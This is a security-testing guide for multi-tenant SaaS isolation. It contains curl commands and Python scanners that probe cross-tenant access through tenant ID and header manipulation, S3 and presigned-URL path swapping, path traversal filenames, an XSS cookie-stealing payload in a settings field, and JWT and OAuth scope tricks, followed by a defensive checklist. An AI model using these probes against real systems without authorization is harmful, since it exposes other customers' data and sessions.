# Multi-Tenancy Isolation Testing Guide

> Test tenant boundary enforcement in multi-tenant applications to identify data leakage, shared resource abuse, and cross-tenant access vulnerabilities. Covers SaaS platforms, cloud environments, and shared infrastructure.

## 1. Understanding Multi-Tenancy Boundaries

Multi-tenant applications share infrastructure between customers. Isolation failures expose one tenant's data to another:

```bash
# Common multi-tenancy patterns and their attack surfaces:
# 1. Shared database with tenant_id column — SQL injection bypasses tenant filter
# 2. Subdomain-based routing — subdomain enumeration + header manipulation
# 3. API key scoping — key leakage or scope confusion
# 4. Shared storage (S3, blob) — predictable paths or missing ACLs

# Identify tenancy model from application behavior
# Check if tenant is determined by:
curl -v https://tenant-a.target.com/api/data  # Subdomain
curl -v https://target.com/api/data -H "X-Tenant-ID: tenant-a"  # Header
curl -v https://target.com/api/data?org=tenant-a  # Parameter
curl -v https://target.com/api/data -H "Authorization: Bearer $TENANT_A_TOKEN"  # Token claim
```

## 2. Cross-Tenant Data Access Testing

Attempt to access another tenant's resources:

```bash
# Test 1: Direct tenant ID manipulation
# Authenticated as Tenant A, try to access Tenant B's data
curl -H "Authorization: Bearer $TENANT_A_TOKEN" \
  "https://api.target.com/api/organizations/tenant-b-id/users"

# Test 2: Header injection for tenant switching
curl -H "Authorization: Bearer $TENANT_A_TOKEN" \
  -H "X-Tenant-ID: tenant-b" \
  -H "X-Organization-ID: tenant-b-id" \
  "https://api.target.com/api/data"

# Test 3: Subdomain-based tenant confusion
# Access Tenant B's subdomain with Tenant A's session cookie
curl -b "session=$TENANT_A_SESSION" \
  "https://tenant-b.target.com/api/users"

# Test 4: Search/filter bypass
# If search queries aren't tenant-scoped:
curl -H "Authorization: Bearer $TENANT_A_TOKEN" \
  "https://api.target.com/api/search?q=*&include_all=true"
```

## 3. Shared Storage Isolation Testing

Test for data leakage through shared storage backends:

```bash
# S3 bucket enumeration for multi-tenant storage
# Pattern: s3://app-data/{tenant-id}/files/
aws s3 ls s3://target-app-data/ --no-sign-request 2>/dev/null
aws s3 ls s3://target-app-data/tenant-b/ --no-sign-request 2>/dev/null

# Test pre-signed URL scope
# Get a pre-signed URL for your own file, then modify the path
PRESIGNED_URL="https://bucket.s3.amazonaws.com/tenant-a/file.pdf?X-Amz-Signature=..."
# Try changing tenant-a to tenant-b in the path
MODIFIED_URL="${PRESIGNED_URL/tenant-a/tenant-b}"
curl -s -o /dev/null -w '%{http_code}' "$MODIFIED_URL"

# Test blob storage path traversal
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/files/download?path=../tenant-b/confidential.pdf"
```

## 4. Database-Level Isolation Testing

Probe for missing tenant filters in database queries:

```python
import requests

def test_tenant_filter_bypass(base_url: str, token: str, own_tenant: str):
    """Test if database queries properly filter by tenant."""
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test 1: Numeric ID enumeration across tenant boundaries
    # If your records are IDs 100-110, try IDs outside that range
    for record_id in range(1, 200):
        resp = requests.get(
            f"{base_url}/api/records/{record_id}",
            headers=headers
        )
        if resp.status_code == 200:
            data = resp.json()
            if data.get("tenant_id") != own_tenant:
                print(f"[CRITICAL] Cross-tenant access: record {record_id} "
                      f"belongs to tenant {data.get('tenant_id')}")
    
    # Test 2: Aggregation endpoint leakage
    # Analytics/reporting endpoints often miss tenant filters
    aggregate_endpoints = [
        "/api/analytics/summary",
        "/api/reports/usage",
        "/api/dashboard/metrics",
        "/api/export/all-records",
    ]
    
    for endpoint in aggregate_endpoints:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers)
        if resp.status_code == 200:
            data = resp.json()
            # Check if response contains more data than expected
            print(f"  {endpoint}: {len(str(data))} bytes returned")
```

## 5. Shared Resource Abuse

Exploit shared infrastructure components:

```bash
# Cache poisoning across tenants
# If Redis/Memcached is shared without key namespacing:
# Tenant A's cache key: "user:123" might collide with Tenant B's "user:123"

# Test: Create a resource that might be cached globally
curl -X POST "https://api.target.com/api/settings" \
  -H "Authorization: Bearer $TENANT_A_TOKEN" \
  -d '{"theme": "<script>alert(document.cookie)</script>"}'

# Check if Tenant B sees the poisoned cache
curl "https://api.target.com/api/settings" \
  -H "Authorization: Bearer $TENANT_B_TOKEN"

# Queue/message bus isolation
# If message queues are shared, messages might leak between tenants
# Test by publishing a message and checking if other tenants receive it

# Shared file processing pipeline
# Upload a file as Tenant A with a predictable name
curl -X POST "https://api.target.com/upload" \
  -H "Authorization: Bearer $TENANT_A_TOKEN" \
  -F "file=@malicious.pdf;filename=../../tenant-b/reports/q4.pdf"
```

## 6. API Key and Token Scope Testing

Verify that authentication tokens are properly scoped:

```bash
# Test 1: Use Tenant A's API key against Tenant B's resources
curl -H "X-API-Key: $TENANT_A_API_KEY" \
  "https://api.target.com/api/v1/tenant-b/data"

# Test 2: JWT tenant claim manipulation
python3 -c "
import jwt, json, base64

token = '$TENANT_A_JWT'
# Decode without verification to see claims
payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '=='))
print('Current tenant:', payload.get('tenant_id', payload.get('org_id')))
# If we can forge: change tenant_id to another tenant
"

# Test 3: OAuth scope confusion between tenants
# Request token with another tenant's scope
curl -X POST "https://auth.target.com/oauth/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$TENANT_A_CLIENT" \
  -d "client_secret=$TENANT_A_SECRET" \
  -d "scope=tenant:tenant-b:read"
```

## 7. Automated Multi-Tenancy Scanner

Comprehensive isolation testing framework:

```python
import requests
from dataclasses import dataclass

@dataclass(frozen=True)
class TenantContext:
    name: str
    token: str
    tenant_id: str
    known_resources: tuple  # Resource IDs belonging to this tenant

def cross_tenant_scan(base_url: str, tenant_a: TenantContext, tenant_b: TenantContext):
    """Systematically test isolation between two tenants."""
    findings = []
    
    # Test A accessing B's known resources
    for resource_id in tenant_b.known_resources:
        endpoints = [
            f"/api/resources/{resource_id}",
            f"/api/resources/{resource_id}/details",
            f"/api/resources/{resource_id}/download",
        ]
        
        for endpoint in endpoints:
            resp = requests.get(
                f"{base_url}{endpoint}",
                headers={"Authorization": f"Bearer {tenant_a.token}"}
            )
            
            if resp.status_code == 200:
                findings.append({
                    "type": "cross_tenant_access",
                    "attacker": tenant_a.name,
                    "victim": tenant_b.name,
                    "endpoint": endpoint,
                    "resource": resource_id,
                    "severity": "CRITICAL"
                })
    
    # Test tenant header injection
    injection_headers = [
        {"X-Tenant-ID": tenant_b.tenant_id},
        {"X-Organization": tenant_b.tenant_id},
        {"X-Forwarded-Tenant": tenant_b.tenant_id},
    ]
    
    for headers in injection_headers:
        headers["Authorization"] = f"Bearer {tenant_a.token}"
        resp = requests.get(f"{base_url}/api/data", headers=headers)
        if resp.status_code == 200 and tenant_b.tenant_id in resp.text:
            findings.append({
                "type": "header_injection",
                "header": list(headers.keys())[0],
                "severity": "CRITICAL"
            })
    
    return findings
```

## 8. Isolation Verification Checklist

After testing, verify these isolation controls:

- Every database query includes tenant_id in WHERE clause (not just application logic)
- Storage paths are validated server-side and cannot be traversed
- Cache keys are namespaced by tenant (e.g., `tenant-a:user:123`)
- Message queues use separate channels/topics per tenant
- Search indices are filtered by tenant at query time
- Background jobs execute within the correct tenant context
- Audit logs cannot be read across tenant boundaries
- Rate limits are applied per-tenant, not globally (one tenant cannot exhaust limits for others)
- Admin/support endpoints that cross tenant boundaries require elevated authentication
